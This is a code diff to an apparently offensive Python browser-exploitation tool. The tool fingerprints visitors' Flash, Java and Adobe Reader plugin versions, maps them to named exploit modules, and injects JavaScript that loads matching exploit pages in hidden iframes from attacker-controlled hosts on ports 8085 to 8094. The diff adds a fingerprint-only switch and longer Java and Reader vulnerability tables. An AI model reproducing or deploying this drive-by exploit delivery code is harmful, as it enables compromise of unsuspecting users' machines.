@@ -6,8 +6,9 @@ import string,cgi,time,urlparse,commands,os,subprocess
 from os import curdir, sep
 import sys
 
-javaSelfsigned=False
-
+#If the fingerprintOnly options is set to True, the other options below is ignored
+fingerprintOnly=True
+javaSelfsigned=True
 runFlash=True
 runJava=True
 runReader=True
@@ -54,6 +55,7 @@ class Handler(BaseHTTPRequestHandler):
             self.end_headers()
 
             for msg in message_parts:
+		vulnText=''
 		if "query=" in msg and "&" in msg:
 			for msg1 in message_parts:
 		             if 'client_address' in msg1:
@@ -61,15 +63,93 @@ class Handler(BaseHTTPRequestHandler):
                    	pluginVer = msg.replace("query=","").split('&')
 		    	for i in pluginVer:
 				if i:
-					vulnText = ''
 					pdtName,pdtVer = i.split("=")
 
-					if(pdtName=='flash'):
+					if(pdtName=='reader'):
+						pdtver0 = int((pdtVer.split(','))[0])
+						pdtver1 = int((pdtVer.split(','))[1])
+						pdtver2 = int((pdtVer.split(','))[2])
+						pdtver01 = str(pdtver0)+','+str(pdtver1)
+
+						if(pdtver01=='9,3' or pdtVer=='9,3,4'):
+							vulnText += '\nadobe_cooltype_sing'
+						if(pdtVer=='9,1,0'):
+							vulnText += '\nadobe_flatedecode_predictor02'
+						if(pdtVer=='8,0,0' or pdtVer=='8,1,2' or pdtVer=='9,0,0'):
+							vulnText += '\nadobe_geticon'
+						if(pdtVer=='8,1,1' or pdtVer=='9,1,0' or pdtver01=='9,2'):
+							vulnText += '\nadobe_media_newplayer'
+						if(pdtVer=='11,0,2' or pdtVer=='10,0,4'):
+							vulnText += '\nadobe_toolbutton'
+						if(pdtVer=='8,1,2'):
+							vulnText += '\nadobe_utilprintf'
+	 					pdtVer = pdtVer.replace(",",".")
+						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
+						#print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC+'\t'+vulnText
+						#print bcolors.OKGREEN+'******************************'+bcolors.ENDC
+					elif(pdtName=='java'):
 						pdtverMaj0 = int((pdtVer.split(','))[0])
 						pdtverMaj1 = int((pdtVer.split(','))[1])
 						pdtverMaj2 = int((pdtVer.split(','))[2])
 						pdtverMaj01 = str(pdtverMaj0)+'.'+str(pdtverMaj1)
-						pdtverMin  = str((pdtVer.split(','))[3])
+						pdtverMaj = str(pdtverMaj0)+'.'+str(pdtverMaj1)+'.'+str(pdtverMaj2)
+						pdtverMin  = int((pdtVer.split(','))[3])
+						pdtverJoin = str(pdtverMaj0)+'.'+str(pdtverMaj1)+'.'+str(pdtverMaj2)+'.'+str(pdtverMin)
+	
+						if(pdtverMaj=='1.7.0'):
+							if(pdtverMin>0 and pdtverMin<22):
+								vulnText += '\njava_jre17_reflection_types'
+							if(pdtverMin>-1 and pdtverMin<12):
+								vulnText += '\njava_jre17_provider_skeleton'
+							if(pdtverMin>0 and pdtverMin<12):
+								vulnText += '\njava_jre17_jmxbean_2'
+							if(pdtverMin>0 and pdtverMin<8):
+								vulnText += '\njava_jre17_method_handle'
+							if(pdtverMin==4):
+								vulnText += '\njava_verifier_field_access'
+							if(pdtverMin>0 and pdtverMin<22):
+								vulnText += '\njava_storeimagearray'
+						if(pdtverMaj=='1.6.0'):
+							if(pdtverMin>0 and pdtverMin<28):
+								vulnText += '\njava_rhino'
+							if(pdtverMin>3 and pdtverMin<28):
+								vulnText += '\njava_jre17_method_handle'				
+							if(pdtverMin==32):
+								vulnText += '\njava_verifier_field_access'
+							if(pdtverMin>0 and pdtverMin<19):
+								vulnText += '\njava_trusted_chain'
+							if(pdtverMin>21 and pdtverMin<46):
+								vulnText += '\njava_storeimagearray'
+							if(pdtverMin>0 and pdtverMin<17):
+								vulnText += '\njava_setdifficm_bof'
+							if(pdtverMin>-1 and pdtverMin<19):
+								vulnText += '\nava_rmi_connection_impl'
+						if(pdtverMaj=='1.5.0'):
+							if(pdtverMin==35):
+								vulnText += '\njava_verifier_field_access'
+							if(pdtverMin>0 and pdtverMin<24):
+								vulnText += '\njava_trusted_chain'
+							if(pdtverMin>3 and pdtverMin<46):
+								vulnText += '\njava_storeimagearray'
+							if(pdtverMin>0 and pdtverMin<22):
+								vulnText += '\njava_setdifficm_bof'
+						if(pdtverMaj=='1.4.2'):
+							if(pdtverMin>0 and pdtverMin<10):
+								vulnText += '\njava_trusted_chain'
+						if(pdtverMaj=='1.4.0'):
+							if(pdtverMin>0 and pdtverMin<25):
+								vulnText += '\njava_setdifficm_bof'
+	
+	 					pdtVer = pdtVer.replace(",",".")
+						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
+						#print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC+'\t'+vulnText
+						#print bcolors.OKGREEN+'******************************'+bcolors.ENDC
+					elif(pdtName=='flash'):
+						pdtverMaj0 = int((pdtVer.split(','))[0])
+						pdtverMaj1 = int((pdtVer.split(','))[1])
+						pdtverMaj2 = int((pdtVer.split(','))[2])
+						pdtverMaj01 = str(pdtverMaj0)+'.'+str(pdtverMaj1)
+						pdtverMin  = int((pdtVer.split(','))[3])
 						pdtverJoin = str(pdtverMaj0)+'.'+str(pdtverMaj1)+'.'+str(pdtverMaj2)+'.'+str(pdtverMin)
 
 						if(pdtVer=='11,7,700,202' or pdtVer=='11.3.372.94'):
@@ -98,11 +178,12 @@ class Handler(BaseHTTPRequestHandler):
 							vulnText += '\nadobe_flashplayer_flash10o'
 	 					pdtVer = pdtVer.replace(",",".")
 						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
-						print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC+'\t'+vulnText
-						print bcolors.OKGREEN+'******************************'+bcolors.ENDC
 					else:
 	 					pdtVer = pdtVer.replace(",",".")
 						print bcolors.OKGREEN+pdtName+bcolors.ENDC+'\t'+pdtVer
+			print bcolors.OKGREEN+'***** Exploits Available *****'+bcolors.ENDC
+			print '\t'+vulnText
+			print bcolors.OKGREEN+'******************************'+bcolors.ENDC
             return
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
@@ -165,7 +246,7 @@ def modifyHTML(filename):
 				contentExploit.append("var plugin = plugins[ao[i]];\n")
 
 				#Adobe Flash
-				if runFlash==True:
+				if runFlash==True and fingerprintOnly==False:
 					contentExploit.append("url = 'http://"+ipAddr+":8094/adobe_flash_avm2';\n")
 					contentExploit.append("if(plugin=='flash' && verFull=='11,7,700,202' || verFull=='11.3.372.94'){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}\n")
 	
@@ -203,7 +284,7 @@ def modifyHTML(filename):
 					contentExploit.append("if(plugin=='flash' && (verMaj1>=9 || verMaj1<10 || (verMaj1=='10' && verMaj2<=2) || (verFull=='10,2,156,12'||verFull=='10,2,154,25'||verFull=='10,2,154,13'||verFull=='10,2,152,33'				|| verFull=='10,2,152,32' || verFull=='10,2,152,0' ))) {iframe.setAttribute('src',url);}\n")
 
 				#Java
-				if runJava==True:
+				if runJava==True and fingerprintOnly==False:
 					contentExploit.append("url = 'http://172.16.91.187:8085/java_jre17_reflection_types';\n")
 					contentExploit.append("if(plugin=='java' && verMaj=='1,7,0'){if(verMin>0 && verMin<22){iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 
@@ -250,7 +331,7 @@ def modifyHTML(filename):
 						contentExploit.append("if(plugin=='java'){{iframesigned.setAttribute('src',url);iframesigned.contentDocument.location.reload(true);}};\n")	
 
 				#Adobe Reader			
-				if runReader==True:
+				if runReader==True and fingerprintOnly==False:
 					contentExploit.append("url = 'http://172.16.91.187:8093/adobe_cooltype_sing';\n")
 					contentExploit.append("if(plugin=='reader' && ((verMaj1=='9' && verMaj2=='3') || verMaj=='9,3,4')){{iframe.setAttribute('src',url);iframe.contentDocument.location.reload(true);}};\n")
 			
